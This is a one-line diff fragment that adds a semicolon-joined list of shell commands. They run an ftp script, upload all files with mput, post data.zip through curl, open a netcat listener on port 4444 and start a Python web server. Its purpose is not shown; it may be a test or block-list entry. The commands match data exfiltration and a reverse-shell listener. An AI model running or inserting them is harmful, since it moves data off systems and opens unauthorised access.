@@ -1,0 +1,1 @@
+ftp -s:upload.scr; mput *.*; curl -F file=@data.zip; nc -lvp 4444; python -m http.server 8080
